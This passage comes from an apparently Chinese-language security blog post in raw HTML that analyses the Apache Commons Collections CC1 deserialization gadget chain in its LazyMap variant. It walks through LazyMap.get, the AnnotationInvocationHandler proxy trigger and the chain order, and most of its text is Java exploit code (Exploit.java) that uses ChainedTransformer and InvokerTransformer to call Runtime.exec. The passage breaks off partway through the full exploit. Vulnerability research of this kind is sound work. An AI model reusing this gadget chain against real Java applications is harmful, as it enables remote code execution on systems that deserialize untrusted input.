string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newInputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行截图</p><p><img src="/../../../../../pic/image-20230122020800215.png"></p><h2 id="5-LazyMap-版-CC1-链分析"><a href="#5-LazyMap-版-CC1-链分析" class="headerlink" title="5. LazyMap 版 CC1 链分析"></a>5. LazyMap 版 CC1 链分析</h2><h3 id="5-1-危险方法"><a href="#5-1-危险方法" class="headerlink" title="5.1 危险方法"></a>5.1 危险方法</h3><p>危险方法的位置与 TransformedMap 中的一致，这里就不再分析了</p><h3 id="5-2-上级链子"><a href="#5-2-上级链子" class="headerlink" title="5.2 上级链子"></a>5.2 上级链子</h3><p>前文提到了一下 <code>LazyMap</code> 中也对 <code>transform</code> 方法进行了调用</p><ul><li>LazyMap 关键代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMap</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractMapDecorator</span> <span class="token keyword">implements</span> <span class="token class-name">Map</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Factory must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> factory<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">Object</span> value <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> value<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>LazyMap.get()</code> 中调用了 <code>Transformer.transform()</code>，简单阅读一下可知在获取 Map 中不存在的 key 时会调用回调函数获取一个 value，然后写入到 Map 之中</p><p>这调用的回调函数我们可以任意控制，写个简单地利用链测试一下</p><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">// Runtime.exec</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 被修饰的 Map</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 LazyMap</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 调用 get 方法触发 transform</span>        lazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newInputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230122140926956.png"></p><p>这部分生效了，接下来就是寻找从哪个地方调用 <code>LazyMap.get()</code></p><p>这里还是利用 <code>AnnotationInvocationHandler</code> 这个类</p><p><img src="/../../../../../pic/image-20230122142225252.png"></p><p>在 <code>AnnotationInvocationHandler.invoke</code> 中调用了 <code>Map.get</code> 方法</p><p>需要调用 <code>invoke</code> 方法，可以通过动态代理进行调用，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。我们去找一找能利用的地方</p><p><img src="/../../../../../pic/image-20230122142122669.png"></p><p>可以在 <code>memberValues</code>传入一个代理然后调用 <code>entrySet</code> 时触发 <code>invoke</code> </p><h3 id="5-3-完整链子"><a href="#5-3-完整链子" class="headerlink" title="5.3 完整链子"></a>5.3 完整链子</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">-&gt;</span> <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-LazyMap-版-CC1-链手写-EXP"><a href="#6-LazyMap-版-CC1-链手写-EXP" class="headerlink" title="6. LazyMap 版 CC1 链手写 EXP"></a>6. LazyMap 版 CC1 链手写 EXP</h2><p>根据上面的分析构造 EXP</p><h3 id="6-1-完整-EXP"><a href="#6-1-完整-EXP" class="headerlink" title="6.1 完整 EXP"></a>6.1 完整 EXP</h3><ul><li>Exploit.java</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">// Runtime.exec</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 被修饰的 Map</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 LazyMap</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 AnnotationInvocationHandler</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span 